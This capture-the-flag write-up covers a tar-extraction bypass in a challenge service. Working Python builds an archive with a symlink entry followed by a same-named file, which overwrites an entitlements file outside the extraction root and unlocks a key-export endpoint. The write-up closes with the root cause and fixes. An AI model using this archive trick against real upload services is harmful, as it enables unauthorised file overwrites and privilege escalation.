# Palette — Tar Extraction Symlink Bypass (300 pts, Misc)

**Target**: `91.99.207.116:16334`
**Flag**: `ctf7{a_link_planted_early_steers_every_write_after}`

## Summary

Palette lets a designer upload a `.tar` "theme pack" that gets extracted
server-side into the workspace. A prior path-traversal bug (plain `../` in
entry names) was patched, and so was the obvious absolute-path variant. Both
patches only inspected the entry *name* string, not what a **symlink** entry
could make a later write resolve to. By planting a symlink entry first and
then a same-named regular-file entry, the extractor dereferences the symlink
and writes attacker-controlled content to an arbitrary path outside the
intended `themes/` extraction root — in this case `settings/entitlements.json`,
which the "billing system" uses to gate the Studio-only `/api/studio/export`
endpoint (which returns the signing key / flag).

## Recon

```
GET /
```
revealed the API surface:
```
POST /api/workspace   -> {"workspace": "<id>"}   (send as X-Workspace header)
GET  /api/workspace    -> files in your workspace
POST /api/upload        (multipart field 'pack', or raw tar body)
GET  /api/plan         -> your entitlements
GET  /api/studio/export -> studio plan only
```
Limits: 256 KiB archive, 64 members, 256 KiB extracted.

Created a workspace:
```
POST /api/workspace -> {"workspace":"c95db6bc2e2e07ceb2a6857662db8599"}
```

Baseline listing/plan:
```
GET /api/workspace -> {"files":["settings/","settings/entitlements.json (97 bytes)","themes/"]}
GET /api/plan       -> {"features":["preview"],"managed_by":"billing -- do not edit","plan":"free"}
GET /api/studio/export -> 403 {"error":"Studio plan required","plan":"free"}
```

## Attempt 1 — plain `../` traversal (confirmed patched)

```python
info = tarfile.TarInfo(name="../settings/entitlements.json")
```
Server response:
```
400 {"error":"path traversal in archive: '../settings/entitlements.json'"}
```
Confirms the ticket's claimed fix is real for this exact vector — the server
explicitly string-checks entry names for `..`.

## Attempt 2 — absolute path (also patched)

```python
info = tarfile.TarInfo(name="/settings/entitlements.json")
```
```
400 {"error":"absolute path in archive: '/settings/entitlements.json'"}
```
Also explicitly blocked by name inspection.

## Attempt 3 — symlink entry, wrong depth

Uploaded a tar containing:
1. a symlink entry `themes/link -> ../settings/entitlements.json`
2. a regular file entry also named `themes/link` with attacker JSON

This failed extraction (`"extraction failed: No such file or directory"`),
and the listing revealed the real layout: uploads actually extract into a
**`themes/themes/`** subdirectory relative to workspace root (one level
deeper than assumed), so a single `../` only escaped to `themes/`, not to
workspace root.

## Attempt 4 — symlink entry, correct depth (successful)

Since the true extraction root is `themes/` directly under the workspace
(the `/api/workspace` listing showed `themes/link -> ...` at the top level,
meaning entry names are relative to `themes/`), a single `../` from there
reaches the workspace root where `settings/` lives:

```python
import tarfile, io
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w") as tf:
    link = tarfile.TarInfo(name="link")
    link.type = tarfile.SYMTYPE
    link.linkname = "../settings/entitlements.json"
    tf.addfile(link)

    data = b'{"features":["preview","export"],"managed_by":"billing -- do not edit","plan":"studio"}'
    info = tarfile.TarInfo(name="link")
    info.size = len(data)
    tf.addfile(info, io.BytesIO(data))
open("symlink2.tar", "wb").write(buf.getvalue())
```

Upload:
```
POST /api/upload -> 200 {"extracted":["link  link -> ../settings/entitlements.json","file  link (87 bytes)"],"ok":true}
```

The extractor:
1. Validates/extracts the symlink entry `link` -> `../settings/entitlements.json`
   (the name itself contains no `..`/leading `/`, so it passes the name
   checks that blocked attempts 1 and 2).
2. Extracts the second entry, also named `link`. Because the first entry
   already created a symlink at that path, the extraction library follows
   the symlink and writes the file content through it — landing the bytes
   at `settings/entitlements.json`, outside the `themes/` sandbox.

Confirmed:
```
GET /api/workspace -> settings/entitlements.json now 87 bytes (was 97)
GET /api/plan       -> {"features":["preview","export"],"managed_by":"billing -- do not edit","plan":"studio"}
```

## Final step — export signing key

```
GET /api/studio/export -> 200 {"plan":"studio","signing_key":"ctf7{a_link_planted_early_steers_every_write_after}"}
```

## Root cause

The "fixed" path-traversal check only inspects the literal tar entry **name**
string for `..` segments and leading `/`. It does not account for a tar
archive containing a **symlink entry followed by a same-named regular-file
entry** ("symlink-then-write" / plant-and-overwrite), which is a distinct,
well-known tar-extraction vulnerability class. The symlink's name passes
every name-based check; the escape happens via the *target* the symlink
points to, which the name checks never inspect, combined with the extractor
following existing symlinks on subsequent writes instead of refusing to
write through a symlink it just created.

## Fix recommendation

When extracting tar archives from untrusted sources:
- Reject or skip symlink/hardlink entries entirely, or resolve and validate
  the symlink target against the sandbox root before creating it.
- When writing a regular-file entry, use `O_NOFOLLOW` (or equivalent) so an
  existing symlink at the target path is never silently followed for the
  write, and/or verify with `os.path.realpath()` that the resolved final
  path stays within the extraction root for every entry type, not just by
  string-matching the raw entry name.
